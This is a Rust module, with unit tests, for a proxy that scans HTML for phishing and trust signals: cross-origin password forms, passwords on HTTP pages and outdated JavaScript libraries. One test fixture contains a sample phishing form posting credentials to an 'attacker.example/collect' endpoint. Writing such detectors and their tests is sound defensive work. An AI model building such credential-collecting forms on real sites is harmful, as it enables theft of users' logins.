//! HTML document analysis for trust signals the proxy can only see by
//! reading the response body.
//!
//! Runs in `BlueFlameHandler::handle_response` once we've confirmed the
//! response is a bounded HTML document (content-type `text/html` and
//! content-length under the cap). We parse with `scraper` (already a
//! dep) and extract three classes of signal:
//!
//! 1. **login-form-cross-origin** - a `<form>` that contains a
//!    `type="password"` input whose action URL resolves to a different
//!    host than the page. Classic phishing shape: the fake login page
//!    POSTs credentials to the attacker's collector on a separate
//!    domain.
//! 2. **password-on-insecure-origin** - a `type="password"` input on a
//!    page served over plain HTTP.
//! 3. **outdated-libraries** - `<script src=...>` URLs that match known
//!    EOL / vulnerable library versions (jQuery 1.x, AngularJS, Bootstrap 3).
//!
//! All analysis is read-only; the caller is responsible for re-emitting
//! the original response body to the browser unchanged.

use std::collections::HashSet;
use std::sync::OnceLock;

use regex::Regex;
use scraper::{Html, Selector};

/// Result of analyzing a single HTML response.
#[derive(Debug, Default, Clone)]
pub struct BodyFindings {
    /// Host of the cross-origin form action, if any. Only set when the
    /// form also contains a password input (plain contact forms on a
    /// third-party host aren't interesting).
    pub login_form_cross_origin: Option<String>,
    /// `true` if any password input is on a page served over plain HTTP.
    pub password_on_insecure_origin: bool,
    /// Outdated library versions detected via `<script src>` URLs.
    /// Deduplicated; capped at a small number so a page that loads the
    /// same library from many CDNs doesn't flood the signal list.
    pub outdated_libraries: Vec<String>,
}

impl BodyFindings {
    pub fn any_signal(&self) -> bool {
        self.login_form_cross_origin.is_some()
            || self.password_on_insecure_origin
            || !self.outdated_libraries.is_empty()
    }
}

/// Inspect an HTML document for trust signals. `page_host` is the
/// hostname from the URL the response came from (lower-case). Parsing
/// errors yield an empty `BodyFindings` - partial HTML still produces a
/// useful `Html` parse, so we rarely see this in practice.
pub fn analyze(html: &str, page_host: &str, page_scheme: &str) -> BodyFindings {
    // `Html::parse_document` is infallible and auto-recovers from
    // malformed markup, so we don't need a Result here.
    let doc = Html::parse_document(html);
    let mut findings = BodyFindings::default();

    // Password field on an HTTP page. Single check per document, so
    // we can short-circuit the moment we see one match.
    let pw_sel = password_selector();
    let has_password = doc.select(pw_sel).next().is_some();
    if has_password && page_scheme == "http" {
        findings.password_on_insecure_origin = true;
    }

    // Login form posting cross-origin. Only meaningful for forms that
    // carry a password input - plain newsletter forms that post to a
    // third-party aren't phishing-shaped.
    if has_password {
        for form in doc.select(form_selector()) {
            let has_pw = form.select(pw_sel).next().is_some();
            if !has_pw {
                continue;
            }
            let Some(action) = form.value().attr("action") else {
                continue;
            };
            // Only absolute URLs with a different host count as cross-origin.
            // Relative URLs (and empty action) target the same origin and are fine.
            if let Ok(u) = url::Url::parse(action) {
                if let Some(action_host) = u.host_str() {
                    let action_host = action_host.to_ascii_lowercase();
                    if action_host != page_host {
                        findings.login_form_cross_origin = Some(action_host);
                        break;
                    }
                }
            }
        }
    }

    // Outdated library detection via script src URLs.
    let mut seen: HashSet<String> = HashSet::new();
    for script in doc.select(script_src_selector()) {
        if seen.len() >= 6 {
            break;
        }
        let Some(src) = script.value().attr("src") else {
            continue;
        };
        if let Some(lib) = detect_old_library(src) {
            if seen.insert(lib.clone()) {
                findings.outdated_libraries.push(lib);
            }
        }
    }

    findings
}

fn password_selector() -> &'static Selector {
    static S: OnceLock<Selector> = OnceLock::new();
    S.get_or_init(|| Selector::parse("input[type=\"password\"]").expect("valid selector"))
}

fn form_selector() -> &'static Selector {
    static S: OnceLock<Selector> = OnceLock::new();
    S.get_or_init(|| Selector::parse("form").expect("valid selector"))
}

fn script_src_selector() -> &'static Selector {
    static S: OnceLock<Selector> = OnceLock::new();
    S.get_or_init(|| Selector::parse("script[src]").expect("valid selector"))
}

/// Detect an old-and-known-bad JS library version from a script src.
/// Only matches libraries where the MAJOR version has been EOL / CVE-ridden
/// long enough that hitting them in the wild is a real warning sign.
fn detect_old_library(src: &str) -> Option<String> {
    if let Some(cap) = jquery_v1_regex().captures(src) {
        return Some(format!(
            "jQuery {} (EOL, known XSS issues)",
            cap.get(1).map(|m| m.as_str()).unwrap_or("1.x")
        ));
    }
    if let Some(cap) = angularjs_regex().captures(src) {
        return Some(format!(
            "AngularJS {} (EOL since 2022)",
            cap.get(1).map(|m| m.as_str()).unwrap_or("1.x")
        ));
    }
    if let Some(cap) = bootstrap_v3_regex().captures(src) {
        return Some(format!(
            "Bootstrap {} (EOL, XSS in tooltips/popovers)",
            cap.get(1).map(|m| m.as_str()).unwrap_or("3.x")
        ));
    }
    None
}

fn jquery_v1_regex() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        // Match `jquery` (case-insensitive), then any run of letters
        // (for paths like `jquery/`, `jquerymigrate`), then one of
        // `-./`, then a `1.x` version. Lets us catch the common CDN
        // layouts: `jquery-1.7.2.min.js`, `jquery/1.7.2/jquery.min.js`,
        // `ajax/libs/jquery/1.7.2/...`.
        Regex::new(r"(?i)jquery[a-z]*[-./](1\.\d+(?:\.\d+)?)").expect("valid regex")
    })
}

fn angularjs_regex() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"(?i)angular[a-z]*[-./](1\.\d+(?:\.\d+)?)").expect("valid regex"))
}

fn bootstrap_v3_regex() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(r"(?i)bootstrap[a-z]*[-./](3\.\d+(?:\.\d+)?)").expect("valid regex")
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn password_field_on_http_flagged() {
        let html = r#"<html><body><form><input type="password"></form></body></html>"#;
        let f = analyze(html, "site.example", "http");
        assert!(f.password_on_insecure_origin);
    }

    #[test]
    fn password_field_on_https_not_flagged() {
        let html = r#"<html><body><form><input type="password"></form></body></html>"#;
        let f = analyze(html, "site.example", "https");
        assert!(!f.password_on_insecure_origin);
    }

    #[test]
    fn login_form_cross_origin_detected() {
        let html = r#"
            <html><body>
                <form action="https://attacker.example/collect">
                    <input type="password">
                </form>
            </body></html>
        "#;
        let f = analyze(html, "legit.example", "https");
        assert_eq!(
            f.login_form_cross_origin.as_deref(),
            Some("attacker.example")
        );
    }

    #[test]
    fn login_form_same_origin_is_fine() {
        let html = r#"
            <html><body>
                <form action="https://legit.example/login">
                    <input type="password">
                </form>
            </body></html>
        "#;
        let f = analyze(html, "legit.example", "https");
        assert!(f.login_form_cross_origin.is_none());
    }

    #[test]
    fn relative_action_not_flagged_as_cross_origin() {
        let html = r#"<form action="/login"><input type="password"></form>"#;
        let f = analyze(html, "legit.example", "https");
        assert!(f.login_form_cross_origin.is_none());
    }

    #[test]
    fn form_without_password_ignored_for_cross_origin() {
        // A newsletter signup posting to a 3rd-party service is normal.
        let html = r#"
            <form action="https://mailchimp.com/subscribe">
                <input type="email">
            </form>
        "#;
        let f = analyze(html, "site.example", "https");
        assert!(f.login_form_cross_origin.is_none());
    }

    #[test]
    fn detects_jquery_1x() {
        let html = r#"<script src="https://cdn.example/jquery-1.7.2.min.js"></script>"#;
        let f = analyze(html, "site.example", "https");
        assert!(f.outdated_libraries.iter().any(|l| l.contains("jQuery 1.")));
    }

    #[test]
    fn detects_angularjs() {
        let html = r#"<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>"#;
        let f = analyze(html, "site.example", "https");
        assert!(f
            .outdated_libraries
            .iter()
            .any(|l| l.contains("AngularJS 1.")));
    }

    #[test]
    fn modern_jquery_not_flagged() {
        let html = r#"<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>"#;
        let f = analyze(html, "site.example", "https");
        assert!(f.outdated_libraries.is_empty());
    }

    #[test]
    fn duplicate_library_not_duplicated() {
        let html = r#"
            <script src="https://a.example/jquery-1.4.js"></script>
            <script src="https://b.example/jquery-1.4.js"></script>
        "#;
        let f = analyze(html, "site.example", "https");
        assert_eq!(f.outdated_libraries.len(), 1);
    }

    #[test]
    fn no_signals_yields_false_any_signal() {
        let f = analyze("<html><body>hi</body></html>", "site.example", "https");
        assert!(!f.any_signal());
    }
}
